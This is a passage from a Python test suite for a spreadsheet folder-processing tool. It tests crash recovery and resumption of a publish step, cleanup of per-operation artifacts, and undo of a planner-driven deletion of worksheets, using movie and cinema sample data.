        selections=[FolderSelection(fileId=source_file.id, sheets=["sheet-dc1"])],
    )
)
plan = AnalysisPlan.model_validate(
    {
        "id": "split-real-crash",
        "title": "按影片拆分",
        "summary": "异常退出后继续发布",
        "actions": [
            {
                "type": "splitGroupAggregate",
                "sheet": snapshot.worksheets[0].name,
                "splitBy": "影片名称",
                "groupBy": ["影院名称", "影院编码"],
                "metrics": [
                    {
                        "operation": "countRows",
                        "outputName": "计数项:影厅",
                        "ratioOutputName": "占比",
                    }
                ],
            }
        ],
        "sourceFingerprint": snapshot.sourceFingerprint,
        "sourceFingerprintSheets": snapshot.sourceFingerprintSheets,
    }
)
request = FolderExecuteRequest(
    sessionId=catalog.sessionId,
    operationId=operation_id,
    plan=plan,
)
ledger = FolderOperationLedger(lambda: database, executor_id="crashed-process")
ledger.register(
    operation_id,
    "real-crash-fingerprint",
    work_directory=str(root),
    session_id=catalog.sessionId,
    plan_id=plan.id,
)
ledger.save_execution_context(
    operation_id,
    request=request.model_dump(mode="json", exclude_none=True),
    authorization=folder_execution_context(request),
)

def checkpoint(value):
    ledger.commit_checkpoint(
        operation_id,
        kind=str(value.get("kind") or "folder_publish"),
        payload=value,
    )
    if value.get("stage") == "publish_prepared":
        os._exit(23)

execute_folder_plan(request, on_checkpoint=checkpoint)
raise SystemExit(99)
'''
    completed = subprocess.run(
        [sys.executable, "-c", script, str(tmp_path), str(database), operation_id],
        cwd=str(Path(__file__).resolve().parents[2]),
        check=False,
    )

    assert completed.returncode == 23
    assert folder_workbooks_module._file_content_fingerprint(source) == original_fingerprint
    interrupted_ledger = FolderOperationLedger(
        lambda: database, executor_id="replacement-process"
    )
    record = interrupted_ledger.get(operation_id)
    checkpoint = interrupted_ledger.checkpoint(operation_id)
    assert record is not None and checkpoint is not None
    assert checkpoint.payload["stage"] == "publish_prepared"
    assert record.authorization is not None
    summary = folder_resume_checkpoint_summary(
        operation_id, record.authorization, checkpoint.payload
    )
    assert summary["canResume"] is True
    claimed = interrupted_ledger.claim_for_resume(
        operation_id, expected_revision=record.revision
    )

    folder_workbooks_module._sessions.clear()
    resumed = resume_folder_plan(
        operation_id,
        claimed.authorization or {},
        checkpoint.payload,
        on_checkpoint=lambda value: interrupted_ledger.commit_checkpoint(
            operation_id,
            kind=str(value.get("kind") or "folder_publish"),
            payload=value,
        ),
    )

    updated = load_workbook(source, data_only=True)
    assert updated["恐怖游轮"]["D2"].value == 2
    updated.close()
    assert resumed.verification.status == "verified"
    assert interrupted_ledger.checkpoint(operation_id).payload["stage"] == "published"


def test_completed_task_artifact_cleanup_only_removes_exact_operation(
    tmp_path: Path,
) -> None:
    first = folder_workbooks_module._task_artifact_directory(tmp_path, "operation-one")
    second = folder_workbooks_module._task_artifact_directory(tmp_path, "operation-two")
    (first / "result.xlsx").write_bytes(b"first")
    (second / "result.xlsx").write_bytes(b"second")

    cleanup_folder_task_artifacts(tmp_path, "operation-one")

    assert not first.parent.exists()
    assert (second / "result.xlsx").read_bytes() == b"second"


def test_folder_bulk_delete_keeps_source_sheet_and_can_be_undone(
    tmp_path: Path, monkeypatch,
) -> None:
    from server.tests.test_claude_sdk_agent import _FakeSdk, _connection, _install_fake
    import server.app.planner as planner
    fake = _FakeSdk(invoke=("plan_delete_other_worksheets", {"keepSheets": ["sheet-dc1"]}))
    _install_fake(monkeypatch, tmp_path, fake)
    monkeypatch.setattr(planner, "selected_model_config", lambda _: _connection())
    source = tmp_path / "movies.xlsx"
    workbook = Workbook()
    workbook.active.title = "sheet-dc1"
    workbook.create_sheet("恐怖游轮")
    workbook.create_sheet("痴迷")
    workbook.save(source)
    workbook.close()
    original_bytes = source.read_bytes()

    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(
                    fileId=catalog.files[0].id,
                    sheets=["sheet-dc1", "恐怖游轮", "痴迷"],
                )
            ],
        )
    )
    response = asyncio.run(
        create_plan(
            PlanRequest(
                prompt="清除sheet-dc1外的所有子表",
                workbook=snapshot,
            )
        )
    )

    assert response.kind == "plan"
    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId,
            plan=_stamp_plan(response.plan, snapshot),
        )
    )

    updated = load_workbook(source)
    assert updated.sheetnames == ["sheet-dc1"]
    updated.close()
    assert result.verification.status == "verified"
    assert result.undo is not None

    undone = undo_folder_execution(
        FolderUndoRequest(
            sessionId=result.undo.sessionId,
            undoId=result.undo.undoId,
        )
    )

    assert undone.filesRestored == ["movies.xlsx"]
    assert source.read_bytes() == original_bytes
